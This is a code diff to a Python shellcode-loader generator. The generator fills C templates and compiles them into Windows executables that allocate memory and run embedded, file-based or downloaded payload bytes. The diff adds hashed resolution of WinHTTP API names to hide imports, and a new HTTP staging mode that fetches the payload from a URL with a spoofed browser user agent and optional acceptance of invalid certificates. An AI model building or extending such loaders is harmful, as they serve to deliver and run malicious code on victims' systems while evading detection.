@@ -13,15 +13,26 @@ def _djb2_hash(s):
     return hash_val & 0xFFFFFFFF # Return as a 32-bit unsigned integer
 
 def _get_api_hashes():
-    """Returns a dictionary of all required API function and module names and their hashes."""
+    """Returns a dictionary of all required API name hashes."""
     api_names = [
-        "KERNEL32.DLL", "NTDLL.DLL", "CABINET.DLL",
         "LoadLibraryA", "VirtualAlloc", "CreateThread", "WaitForSingleObject",
         "CloseHandle", "CreateFileMappingW", "MapViewOfFile", "GetProcessHeap",
         "RtlAllocateHeap", "HeapFree", "CreateFileA", "GetFileSize", "ReadFile",
-        "RtlMoveMemory", "CreateDecompressor", "Decompress", "CloseDecompressor"
+        "RtlMoveMemory", "CreateDecompressor", "Decompress", "CloseDecompressor",
+        "WinHttpOpen", "WinHttpConnect", "WinHttpOpenRequest", "WinHttpSendRequest",
+        "WinHttpReceiveResponse", "WinHttpQueryDataAvailable", "WinHttpReadData",
+        "WinHttpCloseHandle", "WinHttpCrackUrl", "WinHttpSetOption", "WinHttpQueryHeaders"
     ]
-    return {f"hash_{name.lower().replace('.', '_')}": _djb2_hash(name) for name in api_names}
+    module_names = ["KERNEL32.DLL", "NTDLL.DLL", "CABINET.DLL", "WINHTTP.DLL"]
+    
+    hashes = {}
+    for name in api_names:
+        hashes[f"hash_{name.lower()}"] = _djb2_hash(name)
+    for name in module_names:
+        key_name = name.replace('.', '_').lower()
+        hashes[f"hash_{key_name}"] = _djb2_hash(name)
+        
+    return hashes
 
 def _build_compiler_command(options, temp_c_filename, temp_def_filename, output_artifact_filename):
     """A helper function to build the GCC compiler command list."""
@@ -50,21 +61,31 @@ def encode(input_filepath, original_filename, options):
     
     temp_files_to_clean = []
     try:
+        template_dir = os.path.join(os.path.dirname(__file__), 'templates')
+        env = Environment(loader=FileSystemLoader(template_dir), trim_blocks=True, lstrip_blocks=True)
+        template = env.get_template('base.c.j2')
+
         template_vars = {}
         
         api_resolver_choice = options.get('api_resolver', 'string')
         template_vars['api_resolver'] = api_resolver_choice
+        template_vars['api_resolver_partial'] = f"partials/api_resolver_{api_resolver_choice}.c.j2"
         if api_resolver_choice == 'hashed':
             template_vars.update(_get_api_hashes())
 
         data_source_choice = options.get('data_source', 'embedded')
+        template_vars['data_source'] = data_source_choice
         template_vars['data_source_partial'] = f"partials/datasource_{data_source_choice}.c.j2"
-        
+
         if data_source_choice == 'file':
-            file_path = options.get('file_path', '').replace('\\', '\\\\')
-            template_vars['file_path'] = file_path
+            template_vars['file_path'] = options.get('file_path', '').replace('\\', '\\\\')
             template_vars['bytecode_array'] = ""
-        else: # The payload is embedded
+        elif data_source_choice == 'http':
+            template_vars['url'] = options.get('url', '').replace('\\', '\\\\')
+            template_vars['user_agent'] = options.get('user_agent', 'Mozilla/5.0')
+            template_vars['trust_invalid_cert'] = options.get('trust_invalid_cert', 'false')
+            template_vars['bytecode_array'] = ""
+        else: # embedded
             with open(input_filepath, "rb") as f:
                 bytecode_to_embed = f.read()
             template_vars['bytecode_array'] = ", ".join([f"0x{byte:02x}" for byte in bytecode_to_embed])
@@ -82,9 +103,6 @@ def encode(input_filepath, original_filename, options):
             'bytecode_compression': options.get('bytecode_compression')
         })
 
-        template_dir = os.path.join(os.path.dirname(__file__), 'templates')
-        env = Environment(loader=FileSystemLoader(template_dir), trim_blocks=True, lstrip_blocks=True)
-        template = env.get_template('base.c.j2')
         c_source_code = template.render(**template_vars)
 
         temp_c_filename = f"{uuid.uuid4()}.c"
